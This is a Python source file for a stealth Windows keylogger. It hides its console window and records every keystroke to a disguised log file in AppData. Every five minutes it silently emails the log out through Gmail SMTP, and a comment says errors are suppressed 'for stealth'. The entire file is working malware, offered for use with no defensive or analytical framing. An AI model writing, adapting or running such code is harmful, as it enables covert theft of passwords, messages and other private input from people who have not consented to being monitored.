from pynput import keyboard
import smtplib
import threading
import logging
import os
import win32console
import win32gui
from email.mime.text import MIMEText
from datetime import datetime

# === HIDE WINDOW ===
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# === CONFIG ===
EMAIL_ADDRESS = "mygmail.com"
EMAIL_PASSWORD = "password"  # Gmail app password
SEND_INTERVAL = 300  # in seconds (5 minutes)

log_dir = os.path.expanduser("~\\AppData\\Roaming")
log_file = os.path.join(log_dir, "winlog.txt")

# === LOGGING SETUP ===
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# === FUNCTION TO SEND EMAIL ===
def send_email():
    try:
        with open(log_file, 'r') as file:
            data = file.read()

        msg = MIMEText(data)
        msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS

        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        pass  # Fail silently (for stealth)

    # Schedule next send
    threading.Timer(SEND_INTERVAL, send_email).start()

# === FUNCTION TO LOG KEYS ===
def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        logging.info(f'{key}')

# === MAIN LISTENER ===
def start_keylogger():
    send_email()  # Start the first email timer
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

start_keylogger()
